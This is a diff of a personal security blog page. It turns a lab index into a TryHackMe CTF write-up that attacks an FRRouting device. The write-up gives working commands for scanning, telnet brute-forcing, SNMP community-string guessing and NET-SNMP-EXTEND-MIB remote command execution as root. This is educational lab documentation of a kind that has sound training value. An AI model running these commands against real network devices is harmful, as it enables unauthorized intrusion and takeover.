@@ -5,11 +5,10 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Penetration Testing | Jenn Shagrin</title>
-<meta name="keywords" content="">
-<meta name="description" content="Hands-on penetration testing lab writeups covering web exploitation, privilege escalation, post-exploitation, and CTF challenges.">
+<title>Operation Takeover | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — FRRouting Telnet VTY on non-standard port, Telnet IAC byte recognition, SNMP community string discovery, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag.">
 <meta name="author" content="">
-<link rel="canonical" href="https://jennshaggy.github.io/applied-projects.html">
+<link rel="canonical" href="https://jennshaggy.github.io/operation-takeover.html">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -68,15 +67,15 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/assets/css/extended/harmonize.css">
-<meta property="og:url" content="https://jennshaggy.github.io/applied-projects.html">
+<meta property="og:url" content="https://jennshaggy.github.io/operation-takeover.html">
 <meta property="og:site_name" content="Jenn Shagrin">
-<meta property="og:title" content="Penetration Testing">
-<meta property="og:description" content="Hands-on penetration testing lab writeups covering web exploitation, privilege escalation, post-exploitation, and CTF challenges.">
+<meta property="og:title" content="Operation Takeover">
+<meta property="og:description" content="FRRouting Telnet VTY, SNMP community string discovery, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Penetration Testing">
-<meta name="twitter:description" content="Hands-on penetration testing lab writeups covering web exploitation, privilege escalation, post-exploitation, and CTF challenges.">
+<meta name="twitter:title" content="Operation Takeover">
+<meta name="twitter:description" content="FRRouting Telnet VTY, SNMP community string discovery, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag.">
 </head>
 
 <body id="top">
@@ -145,91 +144,155 @@
 <main class="main">
 <article class="post-single">
   <header class="post-header">
-    <h1 class="post-title entry-hint-parent">Penetration Testing</h1>
-    <div class="post-description">Lab writeups, CTF documentation, and offensive security work. Evidence of work, not concept summaries.</div>
+    <h1 class="post-title entry-hint-parent">Operation Takeover</h1>
+    <div class="post-description">TryHackMe CTF &mdash; Take control of the network one router at a time. I was really hoping this one would land on a router prompt. I speak Cisco IOS almost fluently. It still delivered.</div>
   </header>
 
   <div class="post-content">
 
-<p>This section documents hands-on lab work across TryHackMe paths and CTF challenges. Each page covers a specific technique, vector, or machine with real commands, real output, and real methodology.</p>
+<p>We've gained access to the network devices VLAN. Time to hack into a router. One objective: find the flag in <code>/root/</code>.</p>
 
 <hr>
 
-<h2>TryHackMe</h2>
+<h2>Enumeration</h2>
 
-<h3>CTF Challenges</h3>
-<ul>
-<li><a href="/decryptify.html">Decryptify</a> — JavaScript deobfuscation, invite code brute force, user enumeration, padding oracle attack</li>
-<li><a href="/valley-ctf.html">Valley</a> — credential exposure, PCAP analysis, UPX binary analysis, Python library hijack via cron</li>
-<li><a href="/jack-ctf.html">Jack</a> — WordPress enumeration, XML-RPC credential attack, User Role Editor privilege escalation via Burp, Akismet plugin reverse shell, SSH key extraction, Python os.py hijack for root</li>
-<li><a href="/operation-endgame.html">Operation Endgame</a> — Active Directory attack chain, Kerberoasting, credential spray, Bloodhound, targeted Kerberoast, plaintext credentials in PowerShell script, smbexec to SYSTEM</li>
-<li><a href="/ledger-ctf.html">Ledger</a> — Active Directory with certificate services, guest LDAP enumeration, shared password, RDP, ESC1 cert abuse via certipy, Administrator TGT, smbexec shell</li>
-<li><a href="/injects-ctf.html">Injects</a> — SQLi client-side filter bypass, recursive keyword obfuscation, mail.log credential recovery, table drop, admin access, SSTI via Twig CVE-2024-45411, RCE</li>
-<li><a href="/operation-takeover.html">Operation Takeover</a> — FRRouting Telnet VTY enumeration, Telnet IAC byte recognition, SNMP community string discovery via onesixtyone, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag</li>
-</ul>
+<pre><code>nmap -sC -sV -Pn -p- -T4 10.144.132.135</code></pre>
 
-<hr>
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.28 AM.png" alt="nmap basic scan results" style="max-width:100%;margin:1rem 0;">
 
-<h3>Privilege Escalation</h3>
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.49 AM.png" alt="nmap continued — messages in the output worth deciphering" style="max-width:100%;margin:1rem 0;">
 
-<h4><a href="/linux-privesc.html">Linux Privilege Escalation</a></h4>
-<p>Seven vectors, real exploitation, first successful local root.</p>
-<ul>
-<li><a href="/linux-privesc-kernel.html">Kernel Exploit — CVE-2015-1328</a></li>
-<li><a href="/linux-privesc-sudo.html">Sudo Misconfiguration</a></li>
-<li><a href="/linux-privesc-suid.html">SUID Abuse — base64</a></li>
-<li><a href="/linux-privesc-capabilities.html">Capabilities — vim cap_setuid</a></li>
-<li><a href="/linux-privesc-cron.html">Cron Job Hijack</a></li>
-<li><a href="/linux-privesc-path.html">PATH Hijacking</a></li>
-<li><a href="/linux-privesc-nfs.html">NFS no_root_squash</a></li>
-</ul>
+<p>Messages buried in that output. Deciphering momentarily.</p>
 
-<h4><a href="/windows-privesc.html">Windows Privilege Escalation</a></h4>
-<p>Five vectors from low-privilege user to SYSTEM.</p>
-<ul>
-<li><a href="/windows-privesc-credentials.html">Stored Credentials</a></li>
-<li><a href="/windows-privesc-scheduled-tasks.html">Scheduled Task Abuse</a></li>
-<li><a href="/windows-privesc-service-exe.html">Service Executable Permissions</a></li>
-<li><a href="/windows-privesc-unquoted-path.html">Unquoted Service Path</a></li>
-<li><a href="/windows-privesc-service-dacl.html">Insecure Service DACL</a></li>
-</ul>
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.144.132.135 -oN Operation_Takeover_nmap_result.txt</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.36.45 AM.png" alt="vuln scan running" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.04 AM.png" alt="vuln scan output continued" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.20 AM.png" alt="FRRouting banner in DNSVersionBindReqTCP output" style="max-width:100%;margin:1rem 0;">
+
+<p>This immediately stood out:</p>
+
+<pre><code>DNSVersionBindReqTCP:
+|     Hello, this is FRRouting (version 10.0).
+|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
+|     User Access Verification</code></pre>
+
+<p>FRRouting v10.0. A quick exploit search pulled 2-3 high-interest CVEs. Tabs left open for later.</p>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.46.06 AM.png" alt="CVE search results for FRRouting 10.0" style="max-width:100%;margin:1rem 0;">
+
+<p>Port 2623 was calling. Visited <code>http://TARGETIP:2623</code>:</p>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.49.00 AM.png" alt="Port 2623 in browser — Telnet IAC negotiation bytes rendered as garbage" style="max-width:100%;margin:1rem 0;">
+
+<p>What looks like garbage output is actually open Telnet IAC negotiation bytes. <code>ÿ</code> equates to <code>0xFF</code> — the Telnet IAC marker. This is already fun.</p>
 
 <hr>
 
-<h3>Web Exploitation</h3>
-<ul>
-<li><a href="/upload-vulnerabilities.html">Upload Vulnerabilities</a> — file upload bypass, client-side filter bypass, magic number spoofing, Node/Express backend exploitation</li>
-<li><a href="/burp-suite.html">Burp Suite</a> — header injection, union-based SQLi, Burp Macros + CSRF brute force</li>
-</ul>
+<h2>Telnet Enumeration</h2>
+
+<p>The system was already showing signs of a failure threshold limit. Tested the Telnet discovery carefully with Ncat's Telnet handling:</p>
+
+<pre><code>ncat --telnet 10.144.132.135 2623</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.57.09 AM.png" alt="ncat telnet connection — VTY password prompt" style="max-width:100%;margin:1rem 0;">
+
+<p>Password-only VTY auth confirmed — FRRouting documentation is clear that no username is needed. Critical detail for crafting a clean ncrack command.</p>
+
+<p>Checked the fasttrack wordlist before committing to brute force:</p>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.05.16 AM.png" alt="fasttrack.txt sanity check" style="max-width:100%;margin:1rem 0;">
+
+<p>First ncrack attempt had a syntax error — the service name needed to be attached to the port:</p>
+
+<pre><code>ncrack -p telnet:2623 --user test -P fasttrack.txt 10.144.132.135</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.19.27 AM.png" alt="ncrack syntax error — service name required" style="max-width:100%;margin:1rem 0;">
+
+<p>Ncrack ran longer than comfortable. While waiting, I read more FRRouting documentation and noted the VTY CLI commands for later. Then tried a few manual attempts to eliminate obvious candidates:</p>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.47.03 AM.png" alt="Manual telnet attempts — ruling out obvious passwords" style="max-width:100%;margin:1rem 0;">
+
+<p>Single-password brute force wasn't going to hold up here. Time to think outside the box.</p>
 
 <hr>
 
-<h3>Post-Exploitation</h3>
-<ul>
-<li><a href="/meterpreter.html">Metasploit: Meterpreter</a> — session management, architecture mismatch debugging, hashdump, NTLM cracking, targeted file discovery</li>
-</ul>
+<h2>SNMP &mdash; The Real Way In</h2>
+
+<p>Probed for SNMP on UDP port 161:</p>
+
+<pre><code>nmap -sU -p 161 --script snmp-brute 10.144.132.135</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.54.52 AM.png" alt="SNMP port 161 open — snmp-brute running" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.00.06 AM.png" alt="Further SNMP probing" style="max-width:100%;margin:1rem 0;">
+
+<p>Port 161 open. Pressed further with onesixtyone against a community strings wordlist:</p>
+
+<pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.144.132.135</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.04.42 AM.png" alt="onesixtyone — community string pr1v4t3 confirmed" style="max-width:100%;margin:1rem 0;">
+
+<p>Community string: <code>pr1v4t3</code>. SNMP is the hook.</p>
 
 <hr>
 
-<h2>SANS Institute</h2>
+<h2>SNMP Write Access and RCE</h2>
 
-<h3>Baker221b — Mysteries in the Cloud</h3>
-<p>Cloud incident response workshop across four cases covering Azure, Microsoft 365, AWS, and GCP.</p>
-<ul>
-<li><a href="/baker221b-warmup.html">Azure Activity and Terminal Warmup</a></li>
-<li><a href="/baker221b-phishing.html">Cloud Account Compromise via Phishing</a> — Evilginx AiTM, user-agent pivot, M365 destructive activity</li>
-<li><a href="/baker221b-aws-key.html">Stolen Access Key from Source Code Repository</a> — TruffleHog, git history forensics, CloudTrail S3 pivot</li>
-<li><a href="/baker221b-gcp-shadow-it.html">Shadow IT in GCP Account</a> — inventory diff, asset type validation, VPC flow log analysis</li>
-</ul>
+<p>Confirmed read access with snmpwalk, then tested write access by renaming the host:</p>
+
+<pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 1.3.6.1.2.1.1.1.0
+snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.11.34 PM.png" alt="snmpwalk returning system info, snmpset renaming host to Pwned" style="max-width:100%;margin:1rem 0;">
+
+<p>Write access confirmed. Right access confirmed, more like it.</p>
+
+<p>Extended to RCE via NET-SNMP-EXTEND-MIB:</p>
+
+<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
+  'nsExtendStatus."command"' = createAndGo \
+  'nsExtendCommand."command"' = /bin/bash \
+  'nsExtendArgs."command"' = '-c "ls /root"'</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.16.14 PM.png" alt="NET-SNMP-EXTEND-MIB RCE setup — ls /root" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.17.32 PM.png" alt="snmpwalk returning ls /root output" style="max-width:100%;margin:1rem 0;">
+
+<p>Inching closer. Pulled the trigger:</p>
+
+<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
+  'nsExtendStatus."command"' = createAndGo \
+  'nsExtendCommand."command"' = /bin/bash \
+  'nsExtendArgs."command"' = '-c "cat /root/flag.txt"'</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.19.47 PM.png" alt="cat /root/flag.txt via SNMP RCE" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
+
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.20.51 PM.png" alt="Flag retrieved via SNMP RCE" style="max-width:100%;margin:1rem 0;">
+
+<p>Definitely my solution, not my problem.</p>
+
+<p><em>*mic drop*</em></p>
 
 <hr>
 
-<p><em>Updated as labs are completed. Active Directory coverage coming soon.</em></p>
+<h2>Full Attack Chain</h2>
+
+<pre><code>nmap → FRRouting v10.0 on port 2623, SNMP port 161
+→ Telnet IAC bytes recognized on port 2623 → VTY password-only auth
+→ Brute force not viable → pivot to SNMP
+→ onesixtyone → community string: pr1v4t3
+→ snmpwalk confirms read access → snmpset confirms write access
+→ NET-SNMP-EXTEND-MIB → RCE → cat /root/flag.txt → flag</code></pre>
 
   </div>
-
-  <footer class="post-footer">
-  </footer>
+  <footer class="post-footer"></footer>
 </article>
 </main>
 
